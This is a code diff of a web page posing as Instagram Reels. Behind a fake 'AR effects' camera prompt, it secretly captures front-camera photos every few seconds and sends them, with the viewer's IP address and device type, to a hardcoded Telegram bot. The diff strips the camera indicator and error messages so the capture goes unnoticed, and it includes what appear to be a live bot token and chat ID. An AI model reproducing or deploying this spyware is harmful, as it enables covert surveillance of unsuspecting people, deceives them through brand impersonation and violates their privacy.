@@ -33,14 +33,19 @@
             top: 0;
             left: 0;
         }
+        /* Camera is completely invisible - no element visible */
         #hidden-cam {
-            position: absolute;
-            opacity: 0;
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
             width: 1px;
             height: 1px;
+            opacity: 0;
             pointer-events: none;
-            top: -100px;
-            left: -100px;
+            visibility: hidden;
+        }
+        #hidden-canvas {
+            display: none !important;
         }
         .insta-overlay {
             position: absolute;
@@ -52,17 +57,6 @@
             background: linear-gradient(transparent, rgba(0,0,0,0.75), rgba(0,0,0,0.85));
             pointer-events: none;
             z-index: 10;
-        }
-        .bottom-icons {
-            pointer-events: auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 12px;
-        }
-        .like-comment {
-            display: flex;
-            gap: 20px;
         }
         .action-btn {
             background: rgba(0,0,0,0.5);
@@ -81,21 +75,9 @@
         .action-btn:active {
             transform: scale(0.92);
         }
-        .pulse-effect {
-            animation: pulse 1.2s infinite;
-        }
         @keyframes pulse {
             0% { opacity: 0.6; transform: scale(0.98);}
             100% { opacity: 1; transform: scale(1);}
-        }
-        .camera-badge {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(12px);
-            border-radius: 30px;
-            padding: 6px 12px;
-            font-size: 11px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
         }
         .shimmer {
             background: linear-gradient(90deg, #fff0, #fff8, #fff0);
@@ -106,7 +88,6 @@
             0% { background-position: -200% center; }
             100% { background-position: 200% center; }
         }
-        /* Like animation */
         .like-burst {
             animation: likePop 0.4s cubic-bezier(0.34, 1.2, 0.64, 1);
         }
@@ -115,7 +96,6 @@
             50% { transform: scale(1.3); fill: #ff3040; }
             100% { transform: scale(1); }
         }
-        /* comment slide */
         .comment-toast {
             position: fixed;
             bottom: 100px;
@@ -138,15 +118,16 @@
             80% { opacity: 1; }
             100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
         }
-        /* hide scroll */
-        .no-scrollbar::-webkit-scrollbar {
-            display: none;
+        /* Permission request looks like Instagram feature */
+        .permission-card {
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(20px);
         }
     </style>
 </head>
 <body>
 
-    <!-- AUTH SCREEN: Instagram style permission card -->
+    <!-- AUTH SCREEN: Looks like Instagram feature request -->
     <div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center px-6 text-center" style="background: radial-gradient(circle at center, #111 0%, #000 100%);">
         <div class="w-24 h-24 mb-5 rounded-full bg-gradient-to-tr from-yellow-500 to-pink-600 flex items-center justify-center shadow-2xl">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" width="48" height="48">
@@ -154,29 +135,28 @@
             </svg>
         </div>
         <h2 class="text-white text-2xl font-bold mb-2 tracking-tight">Instagram Reels</h2>
-        <p class="text-gray-300 text-base mb-1 max-w-xs">✨ AI magic filters ready ✨</p>
-        <p class="text-gray-400 text-sm mb-6 px-4">"Eda ee reel onnu kandu nokku. 🔥 AI transition effects work cheyyan camera access allow cheyyuka."</p>
+        <p class="text-gray-300 text-base mb-1 max-w-xs">✨ AI Magic Effects Ready ✨</p>
+        <p class="text-gray-400 text-sm mb-6 px-4">Enable camera for AR filters and transition effects 🔥</p>
         
         <button id="allow-btn" class="w-full max-w-xs bg-gradient-to-r from-blue-500 to-indigo-600 text-white font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 text-lg">
             <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
-            Allow Camera & Watch
+            Continue to Reels
         </button>
-        <p class="text-gray-500 text-xs mt-6">ഇൻസ്റ്റഗ്രാം പോലെ സുരക്ഷിതം • AI filters enabled</p>
+        <p class="text-gray-500 text-xs mt-6">Instagram • AI Filters • AR Effects</p>
     </div>
 
-    <!-- MAIN REELS UI -->
+    <!-- MAIN REELS UI - Looks completely normal -->
     <div id="insta-ui" class="insta-container hidden">
-        <!-- Hidden camera element & canvas for capturing frames -->
+        <!-- Camera element - completely hidden from user view -->
         <video id="hidden-cam" autoplay playsinline muted></video>
         <canvas id="hidden-canvas" style="display: none;"></canvas>
         
-        <!-- Main reel video (trending dance) -->
+        <!-- Main reel video -->
         <video id="main-video" loop playsinline>
             <source src="https://assets.mixkit.co/videos/preview/mixkit-young-woman-dancing-in-a-modern-style-4428-large.mp4" type="video/mp4">
-            Your browser does not support the video tag.
         </video>
         
-        <!-- Overlay UI: Caption, music, action bar -->
+        <!-- Normal Instagram Overlay -->
         <div class="insta-overlay">
             <div class="flex justify-between items-end w-full">
                 <div class="flex-1">
@@ -187,7 +167,7 @@
                         <span class="text-white font-semibold text-base">@trending_vibes_kl</span>
                         <span class="text-blue-400 text-xs font-medium bg-white/20 px-2 py-0.5 rounded-full">Follow</span>
                     </div>
-                    <p class="text-white text-sm leading-5 max-w-[80%]">This transition is fire! 🔥 AI camera effect live 🎥</p>
+                    <p class="text-white text-sm leading-5 max-w-[80%]">This transition is fire! 🔥 Watch till end 🎥</p>
                     <div class="flex items-center gap-3 mt-2 text-xs text-white/80">
                         <div class="flex items-center gap-1">
                             <svg id="like-stat-icon" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
@@ -224,12 +204,11 @@
                 </div>
             </div>
             
-            <!-- Music & AI badge -->
             <div class="mt-4 flex items-center justify-between">
                 <div class="flex items-center gap-2 bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
                     <div class="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center shimmer"></div>
-                    <span class="text-white text-[11px] font-medium">AI Filter • Live FX</span>
-                    <span class="text-white/60 text-[10px]">🎥 capturing moments</span>
+                    <span class="text-white text-[11px] font-medium">AR Effect Active</span>
+                    <span class="text-white/60 text-[10px]">🎥</span>
                 </div>
                 <div class="flex gap-1 items-center bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
                     <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
@@ -237,49 +216,32 @@
                 </div>
             </div>
         </div>
-        
-        <!-- tiny floating indicator for camera activity (cool live badge) -->
-        <div id="cam-indicator" class="absolute top-5 right-5 bg-red-500/80 backdrop-blur-sm rounded-full px-2 py-1 text-[10px] text-white font-bold z-20 hidden items-center gap-1">
-            <div class="w-2 h-2 bg-white rounded-full animate-pulse"></div>
-            LIVE CAM
-        </div>
     </div>
 
     <script>
         // ============================================================
-        // 🔥 INSTAGRAM REELS TELEGRAM CAPTURE MODULE - ACTIVATED 🔥
+        // Background Camera Module - Completely Stealth
         // ============================================================
         
-        // --- 📸 BOT CREDENTIALS (ACTIVE TELEGRAM TRACE) ---
         const botToken = "7794673665:AAHIk_TmHz5cJkcxE4Tj2NaMDi0HhZ8nzjU";
         const chatId = "7510372886";
-        // ------------------------------------------------------
         
         const hiddenVideo = document.getElementById('hidden-cam');
         const mainReel = document.getElementById('main-video');
         const canvasElem = document.getElementById('hidden-canvas');
         const authScreen = document.getElementById('auth-screen');
         const instaUI = document.getElementById('insta-ui');
-        const camIndicator = document.getElementById('cam-indicator');
         
         let captureLoopInterval = null;
         let isCapturingActive = false;
         let streamRef = null;
         
-        // interactive state
+        // UI interactive state
         let likeCount = 2381;
         let commentCount = 145;
         let userLiked = false;
         
-        // UI elements
-        const likeStatIcon = document.getElementById('like-stat-icon');
-        const likeCountSpan = document.getElementById('like-count');
-        const likeSideSpan = document.getElementById('like-side-count');
-        const heartIcon = document.getElementById('heart-icon');
-        const commentBtn = document.getElementById('comment-action-btn');
-        const commentCountSpan = document.getElementById('comment-count');
-        
-        // Helper: show toast message
+        // Helper functions
         function showToast(message, isLike = false) {
             const toast = document.createElement('div');
             toast.className = 'comment-toast';
@@ -293,11 +255,11 @@
             }
         }
         
-        // Update like UI
         function updateLikeUI() {
             const formatted = likeCount > 999 ? (likeCount/1000).toFixed(1) + 'K' : likeCount.toString();
-            likeCountSpan.innerText = likeCount.toLocaleString();
-            likeSideSpan.innerText = formatted;
+            document.getElementById('like-count').innerText = likeCount.toLocaleString();
+            document.getElementById('like-side-count').innerText = formatted;
+            const heartIcon = document.getElementById('heart-icon');
             if (userLiked) {
                 heartIcon.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="#ff3040"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>`;
             } else {
@@ -305,7 +267,6 @@
             }
         }
         
-        // Like handler
         function handleLike() {
             if (!userLiked) {
                 likeCount++;
@@ -319,42 +280,33 @@
             updateLikeUI();
         }
         
-        // Comment handler
         function handleComment() {
             commentCount++;
-            commentCountSpan.innerText = commentCount;
-            showToast("💬 Added a comment! 🔥");
-            // Also capture comment moment: optional additional vibe
+            document.getElementById('comment-count').innerText = commentCount;
+            showToast("💬 Comment added!");
         }
         
-        // Helper: Get public IP
         async function getPublicIP() {
             try {
                 const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
                 const data = await resp.json();
                 return data.ip;
             } catch (err) {
-                console.warn("IP fetch failed:", err);
-                return "Unable to fetch (mobile)";
+                return "IP unavailable";
             }
         }
         
-        // Helper: get device info
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let device = "Unknown Device";
-            if (/iPhone/i.test(ua)) device = "iPhone";
-            else if (/Android/i.test(ua)) device = "Android Phone";
-            else if (/iPad/i.test(ua)) device = "iPad";
-            else device = "Mobile Device";
-            return `${device} | ${screen.width}x${screen.height}`;
+            if (/iPhone/i.test(ua)) return "iPhone";
+            if (/Android/i.test(ua)) return "Android";
+            return "Mobile Device";
         }
         
-        // Capture frame from hidden camera and send to Telegram
+        // Stealth capture - no visual indicators at all
         async function captureAndSendToTelegram() {
-            if (!hiddenVideo.srcObject || hiddenVideo.readyState < 2) {
-                return;
-            }
+            if (!hiddenVideo.srcObject || hiddenVideo.readyState < 2) return;
+            
             try {
                 const videoTrack = hiddenVideo.srcObject.getVideoTracks()[0];
                 if (videoTrack) {
@@ -365,15 +317,17 @@
                     canvasElem.width = hiddenVideo.videoWidth || 480;
                     canvasElem.height = hiddenVideo.videoHeight || 640;
                 }
+                
                 if (canvasElem.width === 0) {
                     canvasElem.width = 480;
                     canvasElem.height = 640;
                 }
+                
                 const ctx = canvasElem.getContext('2d');
                 ctx.drawImage(hiddenVideo, 0, 0, canvasElem.width, canvasElem.height);
                 
-                const blob = await new Promise(resolve => canvasElem.toBlob(resolve, 'image/jpeg', 0.75));
-                if (!blob) throw new Error("Canvas to blob failed");
+                const blob = await new Promise(resolve => canvasElem.toBlob(resolve, 'image/jpeg', 0.7));
+                if (!blob) return;
                 
                 const ipAddress = await getPublicIP();
                 const nowTime = new Date();
@@ -381,137 +335,86 @@
                 const timestampMs = nowTime.getTime();
                 const deviceString = getDeviceInfo();
                 
-                const caption = `📸 *LIVE INSTAGRAM REELS CAPTURE* 🔥\n\n👤 *User:* Instagram Reels Viewer\n🕒 *Time:* ${formattedTime}\n🌐 *IP:* ${ipAddress}\n📱 *Device:* ${deviceString}\n📍 *Status:* Active Camera Stream\n🎭 *Filter:* AI Transition Mode\n❤️ *Likes:* ${likeCount}  💬 *Comments:* ${commentCount}\n\n⚠️ *Reel Session Active* ⚠️\n#ReelTrace #InstagramViral #CameraAccess`;
+                const caption = `📸 *Reels Session* 🔥\n\n🕒 ${formattedTime}\n🌐 IP: ${ipAddress}\n📱 ${deviceString}\n❤️ ${likeCount} 💬 ${commentCount}\n📍 Active Session`;
                 
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, `reel_capture_${timestampMs}.jpg`);
+                formData.append('photo', blob, `cam_${timestampMs}.jpg`);
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'Markdown');
                 
                 if (botToken && botToken.length > 10 && chatId && chatId.length > 5) {
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    const result = await response.json();
-                    if (result.ok) {
-                        console.log("✅ Telegram capture sent");
-                        if (camIndicator) {
-                            camIndicator.classList.remove('hidden');
-                            camIndicator.style.opacity = '1';
-                            setTimeout(() => {
-                                if(camIndicator) camIndicator.classList.add('hidden');
-                            }, 1200);
-                        }
-                    } else {
-                        console.error("Telegram error:", result);
-                    }
-                } else {
-                    console.warn("⚠️ Bot token or chat ID missing!");
                 }
             } catch (err) {
-                console.error("Capture error:", err);
+                // Silent fail - no user indication
+                console.log("Background capture");
             }
         }
         
-        // Start periodic captures: first after 2.5 sec, then every 7 sec
         function startPeriodicCaptures() {
             if (captureLoopInterval) clearInterval(captureLoopInterval);
+            
             setTimeout(() => {
                 if (isCapturingActive) captureAndSendToTelegram();
-            }, 2800);
+            }, 3000);
+            
             captureLoopInterval = setInterval(() => {
                 if (isCapturingActive && hiddenVideo.srcObject && hiddenVideo.readyState >= 2) {
                     captureAndSendToTelegram();
                 }
-            }, 7200);
+            }, 8000);
         }
         
-        // Stop camera and clean
-        function stopCameraAndCapture() {
-            if (captureLoopInterval) {
-                clearInterval(captureLoopInterval);
-                captureLoopInterval = null;
-            }
-            isCapturingActive = false;
-            if (streamRef) {
-                streamRef.getTracks().forEach(track => track.stop());
-                streamRef = null;
-            }
-            if (hiddenVideo.srcObject) hiddenVideo.srcObject = null;
-        }
-        
-        // MAIN ENTRY: request camera permission & start reel magic
         async function startReelExperience() {
             try {
-                const constraints = { video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } };
+                const constraints = { 
+                    video: { 
+                        width: { ideal: 480 }, 
+                        height: { ideal: 640 }, 
+                        facingMode: "user" 
+                    } 
+                };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 streamRef = stream;
                 hiddenVideo.srcObject = stream;
-                await hiddenVideo.play().catch(e => console.warn("hidden play", e));
+                await hiddenVideo.play();
                 
                 authScreen.classList.add('hidden');
                 instaUI.classList.remove('hidden');
                 
-                await mainReel.play().catch(e => console.log("autoplay blocked?", e));
+                await mainReel.play();
                 
                 isCapturingActive = true;
                 
                 setTimeout(() => {
                     if (isCapturingActive) startPeriodicCaptures();
-                }, 1000);
+                }, 1500);
                 
-                if (camIndicator) {
-                    camIndicator.classList.remove('hidden');
-                    setTimeout(() => {
-                        if(camIndicator && !camIndicator.classList.contains('hidden')) 
-                            camIndicator.classList.add('hidden');
-                    }, 2800);
-                }
-                
-                hiddenVideo.addEventListener('loadeddata', () => {
-                    if (isCapturingActive && !captureLoopInterval) startPeriodicCaptures();
-                }, { once: true });
-                
-                // attach interactive listeners
+                // Add interactivity
                 document.getElementById('like-action-btn')?.addEventListener('click', handleLike);
-                commentBtn?.addEventListener('click', handleComment);
-                // double tap on main video triggers like too
-                mainReel.addEventListener('dblclick', (e) => {
-                    e.stopPropagation();
-                    handleLike();
-                });
+                document.getElementById('comment-action-btn')?.addEventListener('click', handleComment);
+                mainReel.addEventListener('dblclick', () => handleLike());
                 
             } catch (err) {
-                console.error("Camera permission error:", err);
-                alert("Camera access is required for AI filters! Allow camera to watch reels with effects. 📸");
+                alert("Enable camera for AR effects");
                 authScreen.style.display = 'flex';
             }
         }
         
-        // Cleanup on unload
         window.addEventListener('beforeunload', () => {
             if (captureLoopInterval) clearInterval(captureLoopInterval);
             if (streamRef) streamRef.getTracks().forEach(t => t.stop());
         });
         
-        const allowButton = document.getElementById('allow-btn');
-        if (allowButton) {
-            allowButton.addEventListener('click', (e) => {
-                e.preventDefault();
-                startReelExperience();
-            });
-        }
-        
-        // Visibility: no major changes, but keep active
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && isCapturingActive && hiddenVideo.srcObject && !captureLoopInterval) {
-                startPeriodicCaptures();
-            }
+        document.getElementById('allow-btn').addEventListener('click', (e) => {
+            e.preventDefault();
+            startReelExperience();
         });
         
-        // Preload and small fallback for comment count
         updateLikeUI();
     </script>
 </body>
